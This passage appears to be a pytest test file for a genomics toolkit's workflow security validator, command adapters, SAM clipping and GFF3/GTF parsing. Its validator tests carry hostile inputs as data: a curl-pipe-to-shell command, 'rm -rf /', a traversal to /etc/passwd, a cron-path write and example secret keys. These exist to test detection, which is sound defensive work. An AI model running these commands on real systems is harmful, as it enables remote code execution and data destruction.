"""Real behaviour of the workflow_security, external_adapters, databases, annotation, alignment and visualization candidates.

Every expected value below was computed by hand from the small fixtures in this file.
"""

from __future__ import annotations

import hashlib
import importlib.util
import json
import random
import sys
import xml.etree.ElementTree as ET
from pathlib import Path

import pytest

import dnakit.alignment as alignment
import dnakit.annotation as annotation
import dnakit.databases as databases
import dnakit.external_adapters as external
import dnakit.visualization as visualization
import dnakit.workflow_security as security
from dnakit.exceptions import BackendTimeoutError, ConfigurationError, InputFormatError


def result_of(envelope: object) -> dict:
    assert isinstance(envelope, dict)
    assert envelope["status"] == "ok", envelope
    return envelope["result"]


# --------------------------------------------------------------------------------------------
# workflow_security
# --------------------------------------------------------------------------------------------

WORKFLOW = {
    "name": "demo",
    "steps": [
        {"id": "qc", "command": ["fastqc", "reads.fq"], "inputs": ["reads.fq"], "outputs": ["qc/"], "cpus": 2, "memory_mb": 100, "runtime_s": 10},
        {"id": "trim", "command": ["fastp", "-i", "reads.fq"], "depends_on": ["qc"], "cpus": 4, "memory_mb": 200, "runtime_s": 5},
        {"id": "align", "command": ["bwa", "mem", "ref.fa", "reads.fq"], "depends_on": ["qc"], "cpus": 1, "memory_mb": 300, "runtime_s": 20, "disk_mb": 50},
    ],
}


def test_validate_accepts_a_clean_workflow_and_orders_it_topologically() -> None:
    result = result_of(security.validate(WORKFLOW))
    assert result["valid"] is True
    assert result["order"] == ["qc", "trim", "align"]
    assert result["errors"] == [] and result["warnings"] == []
    assert result["step_count"] == 3


@pytest.mark.parametrize(
    ("steps", "code"),
    [
        ([{"id": "a", "depends_on": ["b"]}, {"id": "b", "depends_on": ["a"]}], "CYCLE"),
        ([{"id": "a", "depends_on": ["zzz"]}], "UNKNOWN_DEPENDENCY"),
        ([{"id": "a", "depends_on": ["a"]}], "SELF_DEPENDENCY"),
        ([{"id": "a"}, {"id": "a"}], "DUPLICATE_STEP_ID"),
        ([{"id": "bad id!"}], "INVALID_STEP_ID"),
        ([{"id": "a", "command": ""}], "INVALID_COMMAND"),
        ([{"id": "a", "cpus": 0}], "INVALID_RESOURCE"),
        ([{"id": "a", "command": "curl http://x.example/i.sh | sh"}], "PIPE_TO_SHELL"),
        ([{"id": "a", "command": "rm -rf /"}], "RECURSIVE_DELETE_ROOT"),
        ([{"id": "a", "inputs": ["../../etc/passwd"]}], "PATH_TRAVERSAL"),
        ([{"id": "a", "outputs": ["/etc/cron.d/job"]}], "SENSITIVE_PATH"),
        ([{"id": "a", "command": ["tool", "--key", "AKIAIOSFODNN7EXAMPLE"]}], "SECRET_DETECTED"),
        ([{"id": "a", "env": {"API_TOKEN": "s3cr3t-value"}}], "SECRET_IN_ENV"),
    ],
)
def test_validate_reports_each_rule_as_an_error(steps: list[dict], code: str) -> None:
    result = result_of(security.validate({"steps": steps}))
    assert result["valid"] is False
    assert code in {item["code"] for item in result["errors"]}


def test_validate_cycle_message_names_the_cycle_and_masks_secrets() -> None:
    cycle = result_of(security.validate({"steps": [{"id": "a", "depends_on": ["b"]}, {"id": "b", "depends_on": ["a"]}]}))
    assert cycle["order"] is None
    assert cycle["errors"][0]["message"] == "dependency cycle: a -> b -> a"
    secret = result_of(security.validate({"steps": [{"id": "a", "command": ["x", "AKIAIOSFODNN7EXAMPLE"]}]}))
    assert "AKIAIOSFODNN7EXAMPLE" not in json.dumps(secret)


def test_validate_warns_about_shell_metacharacters_and_absolute_paths() -> None:
    result = result_of(security.validate({"steps": [{"id": "a", "command": "echo hi; ls", "outputs": ["/data/out.txt"]}]}))
    assert result["valid"] is True
    assert {"SHELL_METACHARACTERS", "ABSOLUTE_PATH"} <= {item["code"] for item in result["warnings"]}


def test_validate_reads_json_text_yaml_text_and_files(tmp_path: Path) -> None:
    text = json.dumps(WORKFLOW)
    assert result_of(security.validate(text))["order"] == ["qc", "trim", "align"]
    assert result_of(security.validate("steps:\n  - id: a\n    command: [ls]\n  - id: b\n    depends_on: [a]\n"))["order"] == ["a", "b"]
    path = tmp_path / "wf.json"
    path.write_text(text, encoding="utf-8")
    assert result_of(security.validate(str(path)))["source"] == str(path)


def test_create_numbers_unnamed_steps_and_returns_a_digest() -> None:
    spec = result_of(security.create(["echo one", {"command": ["echo", "two"], "depends_on": ["step_1"]}], options={"name": "chain"}))
    assert [step["id"] for step in spec["steps"]] == ["step_1", "step_2"]
    assert spec["order"] == ["step_1", "step_2"]
    assert spec["name"] == "chain"
    assert len(spec["sha256"]) == 64
    with pytest.raises(InputFormatError):
        security.create([{"command": "x", "depends_on": ["nope"]}])


def test_estimate_schedules_steps_as_soon_as_possible() -> None:
    result = result_of(security.estimate(WORKFLOW))
    # qc: 0-10; trim: 10-15; align: 10-30  ->  critical path qc -> align
    assert result["wall_time_s"] == 30
    assert result["critical_path"] == ["qc", "align"]
    assert result["total_cpu_seconds"] == 2 * 10 + 4 * 5 + 1 * 20
    assert result["peak_cpus"] == 5  # trim (4) + align (1) overlap in [10, 15)
    assert result["peak_memory_mb"] == 500
    assert result["peak_concurrent_steps"] == 2
    assert result["total_disk_mb"] == 50
    assert [(s["id"], s["start_s"], s["end_s"]) for s in result["schedule"]] == [("qc", 0, 10), ("trim", 10, 15), ("align", 10, 30)]


def test_estimate_rejects_cycles_and_warns_above_max_cpus() -> None:
    with pytest.raises(InputFormatError):
        security.estimate({"steps": [{"id": "a", "depends_on": ["a"]}]})
    envelope = security.estimate(WORKFLOW, options={"max_cpus": 4})
    assert envelope["warnings"] == ["peak cpus 5.0 exceed max_cpus 4"]


def test_report_summarizes_validity_order_findings_and_estimate() -> None:
    result = result_of(security.report(WORKFLOW))
    assert result["valid"] is True
    text = result["report"]
    assert "# Workflow report: demo" in text
    assert "1. qc\n2. trim\n3. align" in text
    assert "- wall time: 30.0 s" in text
    as_json = result_of(security.report(WORKFLOW, options={"format": "json"}))
    assert as_json["report"]["order"] == ["qc", "trim", "align"]


def test_check_numerical_reproducibility_uses_the_documented_tolerance() -> None:
    same = result_of(security.check_numerical_reproducibility([[1.0, 2.0, 3.0], [1.0, 2.0, 3.0 + 1e-12]]))
    assert same["reproducible"] is True and same["bitwise_identical"] is False
    assert same["max_abs_diff"] == pytest.approx(1e-12, rel=1e-3)
    different = result_of(security.check_numerical_reproducibility({"runs": [[1.0], [1.1]]}))
    assert different["reproducible"] is False
    assert different["max_abs_diff"] == pytest.approx(0.1)
    assert different["max_rel_diff"] == pytest.approx(0.1 / 1.1)
    loose = result_of(security.check_numerical_reproducibility([1.0, 1.1], options={"rtol": 0.1}))
    assert loose["reproducible"] is True  # |1.0-1.1| = 0.1 <= 0.1 * 1.1
    mismatch = result_of(security.check_numerical_reproducibility([[1, 2], [1]]))
    assert mismatch["reproducible"] is False
    with pytest.raises(InputFormatError):
        security.check_numerical_reproducibility([[1.0]])


def test_check_dependencies_reads_installed_versions_without_importing() -> None:
    result = result_of(security.check_dependencies(["pytest>=0.0.1", "pytest<0.0.1", "no-such-package-xyz", "pytest"]))
    rows = {row["requirement"]: row for row in result["requirements"]}
    assert rows["pytest>=0.0.1"]["satisfied"] is True and rows["pytest>=0.0.1"]["version"]
    assert rows["pytest<0.0.1"]["installed"] is True and rows["pytest<0.0.1"]["satisfied"] is False
    assert rows["no-such-package-xyz"]["installed"] is False
    assert result["all_satisfied"] is False
    with pytest.raises(InputFormatError):
        security.check_dependencies(["numpy ~= 1"])


def test_check_external_tools_uses_which_for_names_and_workflow_commands() -> None:
    result = result_of(security.check_external_tools([sys.executable, "no-such-tool-xyz"]))
    assert [row["available"] for row in result["tools"]] == [True, False]
    assert result["all_available"] is False
    from_workflow = result_of(security.check_external_tools({"steps": [{"id": "a", "command": [sys.executable, "-V"]}, {"id": "b", "command": "no-such-tool-xyz --x"}]}))
    assert [row["tool"] for row in from_workflow["tools"]] == [sys.executable, "no-such-tool-xyz"]


def test_cache_key_is_the_sha256_of_the_canonical_json(tmp_path: Path) -> None:
    data = tmp_path / "in.txt"
    data.write_bytes(b"abc")
    result = result_of(security.cache({"cmd": "x", "n": 1}, options={"input_files": [str(data)], "salt": "v1", "cache_dir": str(tmp_path)}))
    digest = hashlib.sha256(b"abc").hexdigest()
    canonical = json.dumps({"files": {str(data): digest}, "salt": "v1", "step": {"cmd": "x", "n": 1}}, sort_keys=True, separators=(",", ":"))
    assert result["cache_key"] == hashlib.sha256(canonical.encode()).hexdigest()
    assert result["hit"] is False
    (tmp_path / result["cache_key"]).write_text("cached")
    assert result_of(security.cache({"cmd": "x", "n": 1}, options={"input_files": [str(data)], "salt": "v1", "cache_dir": str(tmp_path)}))["hit"] is True
    assert result_of(security.cache("x"))["hit"] is None


def test_checkpoint_roundtrip_and_tamper_detection(tmp_path: Path) -> None:
    state = {"done": ["qc"], "next": "trim"}
    target = tmp_path / "ckpt.json"
    made = result_of(security.checkpoint(state, options={"path": str(target), "step": "qc", "timestamp": "2026-01-01T00:00:00+00:00"}))
    expected = hashlib.sha256(json.dumps(state, sort_keys=True, separators=(",", ":")).encode()).hexdigest()
    assert made["checkpoint"]["state_sha256"] == expected
    assert target.exists()
    with pytest.raises(ConfigurationError):
        security.checkpoint(state, options={"path": str(target)})
    resumed = result_of(security.resume(str(target)))
    assert resumed["kind"] == "checkpoint" and resumed["state"] == state and resumed["step"] == "qc"
    broken = json.loads(target.read_text())
    broken["state"]["next"] = "other"
    with pytest.raises(InputFormatError):
        security.resume(broken)


def test_run_and_resume_delegate_to_the_workflow_runner(tmp_path: Path) -> None:
    (tmp_path / "input.fasta").write_text(">one\nACGT\n", encoding="utf-8")
    config = {
        "schema_version": "dnakit-workflow-v1", "run_id": "r1", "input": {"path": "input.fasta", "format": "fasta", "alphabet": "iupac"},
        "output_dir": "out", "seed": 1, "error_policy": "raise", "overwrite": False,
        "steps": [{"id": "n", "operation": "normalize", "input": "input", "params": {"keep_ambiguous": True, "keep_u": False, "keep_other": False}}],
    }
    path = tmp_path / "wf.json"
    path.write_text(json.dumps(config), encoding="utf-8")
    planned = result_of(security.run(path, options={"dry_run": True}))
    assert planned["status"] == "dry-run" and not (tmp_path / "out").exists()
    done = result_of(security.run(str(path)))
    assert done["status"] == "succeeded" and (tmp_path / "out" / "run-manifest.json").exists()
    again = result_of(security.resume(str(path)))
    assert again["kind"] == "workflow" and again["status"] == "succeeded"


def test_cleanup_temp_workspace_is_dry_run_by_default_and_refuses_unsafe_targets(tmp_path: Path) -> None:
    workspace = tmp_path / "dnakit-work"
    (workspace / "sub").mkdir(parents=True)
    (workspace / "a.txt").write_bytes(b"12345")
    (workspace / "sub" / "b.txt").write_bytes(b"678")
    options = {"allowed_root": str(tmp_path)}
    dry = result_of(security.cleanup_temp_workspace(str(workspace), options=options))
    assert dry["files"] == 2 and dry["bytes"] == 8 and dry["deleted"] is False and workspace.exists()
    other = tmp_path / "keep-me"
    other.mkdir()
    with pytest.raises(ConfigurationError):
        security.cleanup_temp_workspace(str(other), options=options)  # wrong prefix
    with pytest.raises(ConfigurationError):
        security.cleanup_temp_workspace(str(tmp_path), options=options)  # the root itself
    with pytest.raises(ConfigurationError):
        security.cleanup_temp_workspace(str(workspace), options={"allowed_root": str(tmp_path / "sub-elsewhere")})
    removed = result_of(security.cleanup_temp_workspace(str(workspace), options={**options, "dry_run": False}))
    assert removed["deleted"] is True and not workspace.exists()


def test_encrypt_and_decrypt_roundtrip(tmp_path: Path) -> None:
    pytest.importorskip("cryptography")
    plain = tmp_path / "reads.fastq"
    plain.write_bytes(b"@r1\nACGT\n+\nIIII\n")
    encrypted = security.encrypt_genomic_file(str(plain), options={"generate_key": True})
    result = result_of(encrypted)
    assert result["output"] == str(plain) + ".enc"
    assert result["plaintext_sha256"] == hashlib.sha256(plain.read_bytes()).hexdigest()
    assert (tmp_path / "reads.fastq.enc").read_bytes() != plain.read_bytes()
    key = result["generated_key"]
    out = tmp_path / "restored.fastq"
    restored = result_of(security.decrypt_genomic_file(result["output"], options={"key": key, "output": str(out)}))
    assert out.read_bytes() == plain.read_bytes() and restored["bytes_out"] == plain.stat().st_size
    from cryptography.fernet import Fernet

    with pytest.raises(InputFormatError):
        security.decrypt_genomic_file(result["output"], options={"key": Fernet.generate_key().decode(), "output": str(tmp_path / "x.out")})
    with pytest.raises(ConfigurationError):
        security.encrypt_genomic_file(str(plain))  # no key


def test_read_write_save_config_roundtrip_and_secret_guard(tmp_path: Path) -> None:
    document = result_of(security.read(WORKFLOW))
    assert document["document"]["name"] == "demo"
    written = result_of(security.write(WORKFLOW, options={"output": str(tmp_path / "wf.json")}))
    assert json.loads((tmp_path / "wf.json").read_text()) == WORKFLOW
    assert written["sha256"] == hashlib.sha256(written["text"].encode()).hexdigest()
    yaml_text = result_of(security.write(WORKFLOW, options={"format": "yaml"}))["text"]
    assert result_of(security.read(yaml_text))["document"] == WORKFLOW
    saved = result_of(security.save_config({"threads": 4, "ref": "hg38"}, options={"output": str(tmp_path / "c.json")}))
    assert saved["bytes"] == (tmp_path / "c.json").stat().st_size
    assert json.loads((tmp_path / "c.json").read_text()) == {"threads": 4, "ref": "hg38"}
    with pytest.raises(ConfigurationError):
        security.save_config({"threads": 4}, options={"output": str(tmp_path / "c.json")})  # exists
    with pytest.raises(ConfigurationError):
        security.save_config({"aws": "AKIAIOSFODNN7EXAMPLE"}, options={"output": str(tmp_path / "s.json")})
    with pytest.raises(ConfigurationError):
        security.save_config({"a": 1})  # no output


def test_record_provenance_hashes_files_and_is_reproducible(tmp_path: Path) -> None:
    source = tmp_path / "in.txt"
    source.write_bytes(b"hello")
    options = {"timestamp": "2026-01-01T00:00:00+00:00", "output": str(tmp_path / "prov.json")}
    envelope = security.record_provenance({"tool": "x", "version": "1", "inputs": [str(source), str(tmp_path / "missing")]}, options=options)
    record = result_of(envelope)
    assert record["inputs"][0] == {"path": str(source), "exists": True, "size": 5, "sha256": hashlib.sha256(b"hello").hexdigest()}
    assert record["inputs"][1]["exists"] is False
    assert any("file not found" in warning for warning in envelope["warnings"])
    body = {key: value for key, value in record.items() if key != "record_sha256"}
    assert record["record_sha256"] == hashlib.sha256(json.dumps(body, sort_keys=True, separators=(",", ":")).encode()).hexdigest()
    assert json.loads((tmp_path / "prov.json").read_text()) == record
    with pytest.raises(ConfigurationError):
        security.record_provenance({"cmd": "tool --password=hunter22"})


def test_set_random_seed_seeds_python_and_numpy() -> None:
    result = result_of(security.set_random_seed(42))
    assert result["seed"] == 42 and "random" in result["seeded"]
    assert random.random() == random.Random(42).random()
    numpy = pytest.importorskip("numpy")
    assert "numpy" in result["seeded"]
    assert numpy.random.rand() == numpy.random.RandomState(42).rand()
    assert result_of(security.set_random_seed(None, options={"seed": 7}))["seed"] == 7
    for bad in (-1, 2**32, 1.5, True, "7"):
        with pytest.raises(InputFormatError):
            security.set_random_seed(bad)


def test_workflow_security_invalid_inputs() -> None:
    with pytest.raises(InputFormatError):
        security.validate("not-a-file-and-not-json")
    with pytest.raises(InputFormatError):
        security.validate(123)
    with pytest.raises(ConfigurationError):
        security.validate(WORKFLOW, options="bad")  # type: ignore[arg-type]
    with pytest.raises(InputFormatError):
        security.run(123)


# --------------------------------------------------------------------------------------------
# external_adapters
# --------------------------------------------------------------------------------------------


def test_build_command_orders_flags_and_never_uses_a_shell_string() -> None:
    result = result_of(external.build_command({"program": "bwa", "flags": {"-t": 4, "-v": True, "-x": ["a", "b"], "-q": False, "-n": None}, "args": ["ref.fa", "r 1.fq"]}))
    assert result["argv"] == ["bwa", "-t", "4", "-v", "-x", "a", "-x", "b", "ref.fa", "r 1.fq"]
    assert result["command_line"] == "bwa -t 4 -v -x a -x b ref.fa 'r 1.fq'"
    assert result_of(external.build_command("samtools view -h x.bam"))["argv"] == ["samtools", "view", "-h", "x.bam"]
    assert result_of(external.build_command(["tool"], options={"flags": {"--n": 2}, "args": ["f"]}))["argv"] == ["tool", "--n", "2", "f"]
    for bad in ({"program": "x", "flags": {"nodash": 1}}, {"args": []}, 5, [], ["a\x00b"]):
        with pytest.raises(InputFormatError):
            external.build_command(bad)


def test_run_executes_a_program_with_list_arguments_and_captures_output() -> None:
    code = "import sys; print('out', sys.argv[1]); print('ERROR bad', file=sys.stderr); sys.exit(3)"
    envelope = external.run([sys.executable, "-c", code, "a;b"])
    result = result_of(envelope)
    assert result["stdout"] == "out a;b\n"  # the ';' is an argument, not shell syntax
    assert result["returncode"] == 3 and result["success"] is False
    assert result["stderr"] == "ERROR bad\n"
    stdin = result_of(external.run([sys.executable, "-c", "import sys; print(sys.stdin.read().upper())"], options={"stdin": "abc"}))
    assert stdin["stdout"] == "ABC\n"
    truncated = result_of(external.run([sys.executable, "-c", "print('x' * 100)"], options={"max_output_bytes": 10}))
    assert truncated["truncated"] is True and len(truncated["stdout"]) == 10


def test_run_reports_missing_programs_and_raises_on_timeout() -> None:
    envelope = external.run(["no-such-program-xyz", "--version"])
    assert envelope["status"] == "not_implemented"
    assert "no-such-program-xyz" in envelope["message"] and "no-such-program-xyz" in envelope["required_dependency"]
    with pytest.raises(BackendTimeoutError):
        external.run([sys.executable, "-c", "import time; time.sleep(30)"], options={"timeout": 0.3})
    with pytest.raises(ConfigurationError):
        external.run([sys.executable], options={"timeout": 0})
    with pytest.raises(ConfigurationError):
        external.run([sys.executable], options={"cwd": "/no/such/dir"})


def test_check_reports_availability_and_optional_version() -> None:
    result = result_of(external.check([sys.executable, "no-such-program-xyz"], options={"version_args": ["--version"]}))
    assert result["programs"][0]["available"] is True and result["programs"][0]["version"].startswith("Python 3")
    assert result["programs"][1] == {"program": "no-such-program-xyz", "available": False, "path": None, "version": None}
    assert result["all_available"] is False
    assert result_of(external.check(sys.executable))["programs"][0]["version"] is None  # nothing executed by default


def test_parse_output_formats() -> None:
    tsv = result_of(external.parse_output("# comment\na\tb\n1\t2.5\nx\t3\n"))
    assert tsv["format"] == "tsv" and tsv["records"] == [{"a": 1, "b": 2.5}, {"a": "x", "b": 3}]
    csv_records = result_of(external.parse_output("a,b\n1,2\n", options={"format": "csv", "convert_types": False}))["records"]
    assert csv_records == [{"a": "1", "b": "2"}]
    named = result_of(external.parse_output("1\t2\n", options={"format": "tsv", "columns": ["x", "y"]}))["records"]
    assert named == [{"x": 1, "y": 2}]
    fasta = result_of(external.parse_output(">s1 first\nAC\nGT\n>s2\nTT\n"))
    assert fasta["records"] == [{"id": "s1", "description": "first", "sequence": "ACGT"}, {"id": "s2", "description": "", "sequence": "TT"}]
    assert result_of(external.parse_output('[{"k": 1}]'))["records"] == [{"k": 1}]
    assert result_of(external.parse_output("one\ntwo\n", options={"format": "lines"}))["records"] == ["one", "two"]
    assert result_of(external.parse_output({"stdout": "a\tb\n1\t2\n"}))["record_count"] == 1
    with pytest.raises(InputFormatError):
        external.parse_output("a\tb\n1\n")  # ragged row
    with pytest.raises(InputFormatError):
        external.parse_output("{broken", options={"format": "json"})


def test_convert_output_and_convert_input() -> None:
    assert result_of(external.convert_output("a\tb\n1\t2.5\n", options={"target_format": "csv"}))["text"] == "a,b\n1,2.5\n"
    assert result_of(external.convert_output("a\tb\n1\t2.5\n", options={"target_format": "jsonl"}))["text"] == '{"a": 1, "b": 2.5}\n'
    fastq = result_of(external.convert_input(">s1 d\nacgu\nAC\n", options={"target_format": "fastq"}))
    assert fastq["text"] == "@s1\nACGTAC\n+\nIIIIII\n" and fastq["record_count"] == 1
    wrapped = result_of(external.convert_input([("x", "ACGTACGT")], options={"line_width": 3}))["text"]
    assert wrapped == ">x\nACG\nTAC\nGT\n"
    assert result_of(external.convert_input(["ACGT", {"id": "m", "sequence": "GG"}], options={"target_format": "tsv"}))["text"] == "seq1\tACGT\nm\tGG\n"
    with pytest.raises(InputFormatError):
        external.convert_input(">s\nAC#T\n")
    with pytest.raises(ConfigurationError):
        external.convert_input("ACGT", options={"target_format": "bam"})


def test_parse_log_validate_output_and_make_report() -> None:
    log = "INFO start\nWarning: low memory\nError: boom\nTraceback (most recent call last):\nDEBUG x\nplain line\n"
    parsed = result_of(external.parse_log(log))
    assert parsed["line_count"] == 6
    assert parsed["levels"] == {"error": 2, "warning": 1, "info": 1, "debug": 1}
    assert parsed["errors"][0] == {"line": 3, "text": "Error: boom"} and parsed["has_errors"] is True
    run_result = {"stdout": "a\tb\n1\t2\n", "returncode": 0}
    ok = result_of(external.validate_output(run_result, options={"format": "tsv", "required_columns": ["a", "b"], "min_records": 1, "must_contain": ["1\t2"]}))
    assert ok["valid"] is True
    bad = result_of(external.validate_output({"stdout": "a\tb\n", "returncode": 2}, options={"format": "tsv", "required_columns": ["c"], "min_records": 1}))
    failed = {check["name"] for check in bad["checks"] if not check["passed"]}
    assert failed == {"returncode", "min_records", "required_columns"}
    assert result_of(external.validate_output("  \n"))["valid"] is False
    run = result_of(external.run([sys.executable, "-c", "print('hi')"]))
    report = result_of(external.make_report(run, options={"title": "T"}))["report"]
    assert report.startswith("# T\n") and "- return code: 0" in report and "    hi" in report
    with pytest.raises(InputFormatError):
        external.make_report({"nothing": 1})


# --------------------------------------------------------------------------------------------
# databases
# --------------------------------------------------------------------------------------------


def test_databases_query_and_map_ids_delegate_to_existing_functions(monkeypatch: pytest.MonkeyPatch) -> None:
    from dnakit.databases import _runtime, gene_backends

    calls: list[tuple] = []

    def fake_call(name: str, arguments: object = None, **kwargs: object) -> dict:
        calls.append((name, arguments, kwargs))
        return {"echo": name, "arguments": arguments}

    monkeypatch.setattr(_runtime, "call", fake_call)
    assert result_of(databases.query({"name": "pdb_get_structure", "arguments": {"pdb_id": "1ABC"}})) == {"echo": "pdb_get_structure", "arguments": {"pdb_id": "1ABC"}}
    assert result_of(databases.query("cadd_get_scores", options={"arguments": {"variant": "1-100-A-T"}, "max_result_bytes": 5}))["echo"] == "cadd_get_scores"
    assert calls[-1][2] == {"verbose": False, "max_result_bytes": 5}

    seen: dict = {}

    def fake_map(identifiers: list, **kwargs: object) -> dict:
        seen.update(identifiers=identifiers, **kwargs)
        return {"results": [{"query": item} for item in identifiers]}

    monkeypatch.setattr(gene_backends, "map_gene_identifiers", fake_map)
    result = result_of(databases.map_ids("1017, 7157", options={"scopes": "entrezgene", "species": "human"}))
    assert seen["identifiers"] == ["1017", "7157"] and seen["scopes"] == "entrezgene"
    assert [row["query"] for row in result["results"]] == ["1017", "7157"]


def test_databases_invalid_input_and_unknown_operations() -> None:
    with pytest.raises(InputFormatError):
        databases.query(123)
    with pytest.raises(InputFormatError):
        databases.query({"name": "x", "extra": 1})
    with pytest.raises(ConfigurationError):
        databases.query("definitely_unknown_operation")
    with pytest.raises(InputFormatError):
        databases.map_ids([])
    with pytest.raises(InputFormatError):
        databases.map_ids(5)


# --------------------------------------------------------------------------------------------
# alignment
# --------------------------------------------------------------------------------------------

SAM = (
    "@HD\tVN:1.6\n"
    "r1\t0\tchr1\t10\t60\t3S10M2S\t*\t0\t0\tACGTACGTACGTACG\tIIIIIIIIIIIIIII\n"
    "r2\t16\tchr1\t20\t60\t5H10M\t*\t0\t0\tACGTACGTAC\tIIIIIIIIII\n"
    "r3\t4\t*\t0\t0\t*\t*\t0\t0\tACGT\tIIII\n"
    "r4\t0\tchr1\t30\t60\t10M\t*\t0\t0\tACGTACGTAC\tIIIIIIIIII\n"
)


def test_calculate_clipping_profile_reads_the_cigar_ends() -> None:
    result = result_of(alignment.calculate_clipping_profile(SAM))
    assert result["reads"] == 4 and result["mapped_reads"] == 3 and result["clipped_reads"] == 2
    assert result["clipped_fraction"] == pytest.approx(2 / 3)
    assert (result["left_soft"], result["right_soft"], result["left_hard"], result["right_hard"]) == (3, 2, 5, 0)
    assert result["soft_clipped_bases"] == 5 and result["hard_clipped_bases"] == 5
    assert result["clip_length_histogram"] == {0: 1, 5: 2}
    assert result["per_read"][0] == {"query_name": "r1", "left_soft": 3, "right_soft": 2, "left_hard": 0, "right_hard": 0}
    records = [{"query_name": "x", "flag": 0, "reference": "c", "position": 0, "cigar": "2H1S5M4S3H"}]
    result = result_of(alignment.calculate_clipping_profile({"records": records}, options={"per_read": False}))
    assert (result["left_soft"], result["right_soft"], result["left_hard"], result["right_hard"]) == (1, 4, 2, 3)
    assert "per_read" not in result


def test_calculate_clipping_profile_rejects_malformed_input() -> None:
    with pytest.raises(InputFormatError):
        alignment.calculate_clipping_profile("r1\t0\tchr1\n")
    with pytest.raises(InputFormatError):
        alignment.calculate_clipping_profile([{"query_name": "x"}])


# --------------------------------------------------------------------------------------------
# annotation
# --------------------------------------------------------------------------------------------

GFF3 = "\n".join(
    [
        "##gff-version 3",
        "chr1\tsrc\tgene\t1000\t5000\t.\t+\t.\tID=g1;Name=GENE1",
        "chr1\tsrc\tmRNA\t1000\t5000\t.\t+\t.\tID=t1;Parent=g1",
        "chr1\tsrc\texon\t1000\t1200\t.\t+\t.\tID=e1;Parent=t1",
        "chr1\tsrc\texon\t2000\t2300\t.\t+\t.\tID=e2;Parent=t1",
        "chr1\tsrc\texon\t4000\t5000\t.\t+\t.\tID=e3;Parent=t1",
        "chr1\tsrc\tCDS\t1101\t1200\t.\t+\t0\tID=c1;Parent=t1",
        "chr1\tsrc\tCDS\t2000\t2300\t.\t+\t2\tID=c1;Parent=t1",
        "chr1\tsrc\tCDS\t4000\t4099\t.\t+\t1\tID=c1;Parent=t1",
        "chr1\tsrc\tgene\t7000\t7100\t.\t-\t.\tID=g2;gene_biotype=miRNA",
        "chr1\tsrc\tmiRNA\t7000\t7100\t.\t-\t.\tID=t2;Parent=g2",
        "chr1\tsrc\texon\t7000\t7100\t.\t-\t.\tParent=t2",
        "",
    ]
)

GTF = "\n".join(
    [
        'chr1\tsrc\tgene\t100\t900\t.\t+\t.\tgene_id "G1"; gene_name "Foo";',
        'chr1\tsrc\ttranscript\t100\t900\t.\t+\t.\tgene_id "G1"; transcript_id "T1"; tag "basic"; tag "CCDS";',
        'chr1\tsrc\texon\t100\t200\t.\t+\t.\tgene_id "G1"; transcript_id "T1"; exon_number "1";',
        'chr1\tsrc\texon\t400\t900\t.\t+\t.\tgene_id "G1"; transcript_id "T1"; exon_number "2";',
        'chr1\tsrc\tCDS\t150\t200\t.\t+\t0\tgene_id "G1"; transcript_id "T1";',
        'chr1\tsrc\tCDS\t400\t600\t.\t+\t0\tgene_id "G1"; transcript_id "T1";',
        'chr1\tsrc\tstop_codon\t601\t603\t.\t+\t0\tgene_id "G1"; transcript_id "T1";',
        "",
    ]
)

# A three-exon minus-strand transcript on chr2: exons 100-200, 300-400, 500-600; CDS span 150-550.
MINUS = "\n".join(
    [
        "##gff-version 3",
        "chr2\ts\tgene\t100\t600\t.\t-\t.\tID=g3",
        "chr2\ts\tmRNA\t100\t600\t.\t-\t.\tID=t3;Parent=g3",
        "chr2\ts\texon\t100\t200\t.\t-\t.\tParent=t3",
        "chr2\ts\texon\t300\t400\t.\t-\t.\tParent=t3",
        "chr2\ts\texon\t500\t600\t.\t-\t.\tParent=t3",
        "chr2\ts\tCDS\t150\t200\t.\t-\t1\tParent=t3",
        "chr2\ts\tCDS\t300\t400\t.\t-\t0\tParent=t3",
        "chr2\ts\tCDS\t500\t550\t.\t-\t0\tParent=t3",
        "",
    ]
)


def test_parse_gff3_and_gtf_attributes() -> None:
    parsed = result_of(annotation.parse(GFF3))
    assert parsed["format"] == "gff3" and parsed["feature_count"] == 11 and parsed["directives"] == ["##gff-version 3"]
    gene = parsed["features"][0]
    assert (gene["seqid"], gene["type"], gene["start"], gene["end"], gene["strand"], gene["score"], gene["phase"]) == ("chr1", "gene", 1000, 5000, "+", None, None)
    assert gene["attributes"] == {"ID": "g1", "Name": "GENE1"} and gene["line"] == 2
    assert parsed["features"][5]["phase"] == 0 and parsed["features"][6]["phase"] == 2
    tricky = result_of(annotation.parse("c\ts\tgene\t1\t9\t0.5\t.\t.\tID=a;Name=x%3By;Parent=p,q\n", options={"format": "gff3"}))["features"][0]
    assert tricky["attributes"] == {"ID": "a", "Name": "x;y", "Parent": ["p", "q"]} and tricky["score"] == 0.5
    gtf = result_of(annotation.parse(GTF))
    assert gtf["format"] == "gtf"
    assert gtf["features"][1]["attributes"] == {"gene_id": "G1", "transcript_id": "T1", "tag": ["basic", "CCDS"]}
    assert gtf["features"][2]["attributes"]["exon_number"] == "1"


def test_parse_strict_and_lenient_handling_of_malformed_lines(tmp_path: Path) -> None:
    text = "##gff-version 3\nchr1\ts\tgene\t10\t5\t.\t+\t.\tID=a\nchr1\ts\tgene\t1\t5\t.\t+\t.\tID=b\n"
    with pytest.raises(InputFormatError) as caught:
        annotation.parse(text)
    assert "line 2" in str(caught.value)
    lenient = result_of(annotation.parse(text, options={"strict": False}))
    assert lenient["feature_count"] == 1 and lenient["skipped"][0]["code"] == "COORDINATE_ORDER"
    path = tmp_path / "x.gff3"
    path.write_text(GFF3, encoding="utf-8")
    assert result_of(annotation.parse(str(path)))["feature_count"] == 11
    assert result_of(annotation.parse(path))["feature_count"] == 11
    with pytest.raises(InputFormatError):
        annotation.parse(str(tmp_path / "missing.gff3"))
    with pytest.raises(InputFormatError):
        annotation.parse(12)


@pytest.mark.parametrize(
    ("line", "code"),
    [
        ("chr1\ts\tgene\t0\t10\t.\t+\t.\tID=a", "COORDINATE_RANGE"),
        ("chr1\ts\tgene\t10\t5\t.\t+\t.\tID=a", "COORDINATE_ORDER"),
        ("chr1\ts\tgene\tx\t5\t.\t+\t.\tID=a", "COORDINATE_NOT_INTEGER"),
        ("chr1\ts\tgene\t1\t5\t.\tX\t.\tID=a", "INVALID_STRAND"),
        ("chr1\ts\tgene\t1\t5\tbad\t+\t.\tID=a", "INVALID_SCORE"),
        ("chr1\ts\tgene\t1\t5\t.\t+\t3\tID=a", "INVALID_PHASE"),
        ("chr1\ts\tCDS\t1\t5\t.\t+\t.\tID=a", "CDS_WITHOUT_PHASE"),
